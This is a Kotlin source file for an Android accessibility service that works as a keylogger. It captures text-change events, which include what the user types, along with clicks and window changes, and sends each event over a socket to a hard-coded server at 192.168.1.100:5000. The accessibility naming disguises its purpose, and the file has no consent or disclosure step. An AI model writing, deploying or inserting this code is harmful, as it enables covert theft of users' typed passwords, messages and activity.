package com.accessibility

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.BufferedWriter
import java.io.OutputStreamWriter
import java.net.Socket
import kotlin.concurrent.thread

class AccessibilityMonitorService : AccessibilityService() {
    companion object {
        private const val TAG = "AccessibilityMonitor"
        private const val SERVER_HOST = "192.168.1.100"
        private const val SERVER_PORT = 5000
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val eventText = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "Text Changed: ${event.text}"
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "View Clicked"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "Window Changed: ${event.className}"
            else -> "Event: ${event.eventType}"
        }

        Log.d(TAG, eventText)

        thread {
            try {
                sendToServer(eventText)
            } catch (e: Exception) {
                Log.e(TAG, "Error: ${e.message}")
            }
        }
    }

    private fun sendToServer(data: String) {
        try {
            val socket = Socket(SERVER_HOST, SERVER_PORT)
            val writer = BufferedWriter(OutputStreamWriter(socket.getOutputStream()))
            writer.write("$data\n")
            writer.flush()
            writer.close()
            socket.close()
        } catch (e: Exception) {
            Log.e(TAG, "Connection error: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }
}
